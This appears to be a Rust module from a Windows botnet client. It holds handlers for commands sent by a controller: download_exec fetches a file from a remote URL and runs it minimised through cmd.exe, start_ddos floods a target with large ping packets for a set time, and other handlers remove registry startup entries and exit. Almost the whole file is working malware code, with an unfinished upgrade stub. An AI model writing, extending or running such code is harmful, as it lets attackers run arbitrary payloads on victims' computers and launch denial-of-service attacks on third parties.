extern crate tempdir;
use crate::setuper;
use crate::config;
use tempdir::TempDir;
use std::io::copy;
use std::fs::File;
use std::thread;
use std::process;
use std::time;

// Upgrade function
pub fn upgrade(data: String) {
    let url_n_ver: Vec<&str> = data.split("{sep}").collect();
    if config::VERSION < url_n_ver[1].parse::<u64>().unwrap() {
        let new_ver = download(&url_n_ver[0]);
        // TODO !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
    }
}

// DDoS function
pub fn ddos(target: String) {
    let tnt: Vec<&str> = target.split("{sep}").collect();
    start_ddos(tnt[0].to_string(), tnt[1].parse::<u64>().unwrap());
}

// That function does nothing
pub fn nothing() {
    thread::sleep(time::Duration::from_secs(1));
}

// Function which deletes botnet
pub fn delete_botnet() {
    setuper::rm_startup_reg();
    setuper::rm_true_dir();
    exit();
}

// Close botnet
pub fn exit() {
    process::exit(0x0100);
}

// Download and execute file
pub fn download_exec(url: &'static str) {
    thread::spawn(move || {
        let file_to_exec = download(url);
        let _child = process::Command::new("cmd.exe")
            .arg("/c").arg("START").arg("/MIN")
            .arg(file_to_exec)
            .spawn().unwrap();
    });
}

// Function which is called if there are no internet connection
pub fn no_inet() {
    thread::sleep(time::Duration::from_secs(60));
}

// Download file
fn download(target: &str) -> String {
    let tmp_dir = TempDir::new("temp_files").unwrap();
    let mut response = reqwest::get(target).unwrap();
    let fname = response
        .url()
        .path_segments()
        .and_then(|segments| segments.last())
        .and_then(|name| if name.is_empty() { None } else { Some(name) })
        .unwrap_or("tmp.bin");
    let new_temp_dir = tmp_dir.into_path();
    let fpath = format!("{}\\{}", new_temp_dir.to_str().unwrap(), fname.clone());
    let fname = new_temp_dir.join(fname);
    let mut out = File::create(fname).unwrap();
    copy(&mut response, &mut out).unwrap();
    fpath.to_string()
}

// Start DDoS attack
fn start_ddos(target: String, duration: u64) {
    thread::spawn(move || {
        // TODO !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
        let mut child_ddos = process::Command::new("ping")
            .arg(&target).arg("-l").arg("1000").arg("-t")
            .spawn().unwrap();
        thread::sleep(time::Duration::from_secs(duration));
        child_ddos.kill().unwrap();
    });
}